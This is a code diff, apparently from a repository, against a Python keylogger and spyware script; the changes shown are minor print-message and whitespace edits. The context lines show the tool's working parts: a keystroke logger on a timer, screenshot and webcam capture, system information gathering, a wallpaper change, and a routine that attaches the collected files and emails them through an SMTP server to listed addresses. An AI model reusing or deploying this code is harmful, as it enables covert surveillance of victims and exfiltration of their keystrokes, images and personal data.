@@ -58,6 +58,7 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
+# not used for now
 crypt_key = " " # Generate an encryption key from the Cryptography folder
 
 MAP = {
@@ -91,7 +92,7 @@ class Keylogger:
             self.listener.stop()
             self.timer.cancel()
             return
-        
+
         self.timer = Timer(self.interval, self.report)
         self.timer.start()
 
@@ -166,7 +167,7 @@ def screenshots():
     im = ImageGrab.grab()
     im.save(screenshot_info)
 
-    print("screenshot ok!")
+    print("screenshot ok")
 
 # Get Snap with WebCamera
 def web_camera():
@@ -209,15 +210,16 @@ def send_report(to_mail):
     message.attach(body_part)
 
     for file in files:
-        if os.path.isfile(file): 
-            with open(file,'rb') as _file: 
+        if os.path.isfile(file):
+            with open(file,'rb') as _file:
+                print(f'attatch {os.path.split(file)[1]} ok') 
                 message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
 
     with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
         server.starttls()
         server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
         server.send_message(message)
-        print(f"email sent at {datetime.datetime.now()}")
+        print(f"email sent at {datetime.datetime.now()} to {to_mail}")
 
 def main():
     system_information()
@@ -228,7 +230,7 @@ def main():
     set_wallpaper()
     keys_logger()
     for email in Config.EMAIL_ADDRESS: send_report(email)
+    print('\n...\n')
 
 if __name__ == "__main__":
     main()
-    
